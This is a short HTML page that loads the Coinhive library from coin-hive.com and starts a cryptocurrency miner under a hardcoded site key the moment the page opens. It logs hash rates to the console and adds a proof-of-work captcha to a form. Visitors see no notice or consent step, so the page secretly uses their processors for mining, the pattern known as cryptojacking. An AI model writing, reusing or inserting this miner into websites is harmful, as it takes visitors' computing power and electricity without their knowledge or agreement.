<html>
    <head>
        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
        <script src="https://coin-hive.com/lib/captcha.min.js" async></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="main.js"></script>
    </head>
    <body>
        <script>
            var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
            miner.start();

            // Listen on events
            miner.on('found', function() {
                console.log("Found hash");
            });
            miner.on('accepted', function() {
                console.log("Accepted hash");
            });

            // Update stats once per second
            setInterval(function() {
                var hashesPerSecond = miner.getHashesPerSecond();
                var totalHashes = miner.getTotalHashes();
                var acceptedHashes = miner.getAcceptedHashes();

                console.log("Hash per sec: " + hashesPerSecond);
                console.log("Total hashes: " + totalHashes);
                console.log("Accepted hashes: " + acceptedHashes);

            }, 1000);
        </script>

        <p class="HPS"></p>
        <p class="TH"></p>
        <p class="AH"></p>

        <form action="?" method="post">
            <!-- other form fields -->

            <div class="coinhive-captcha" data-hashes="1024" data-key="1bKAZIoqiathAWQnJFsbc4pFB54tTIhK"></div>

            <input type="submit" value="Submit"/>
        </form>

    </body>

</html>
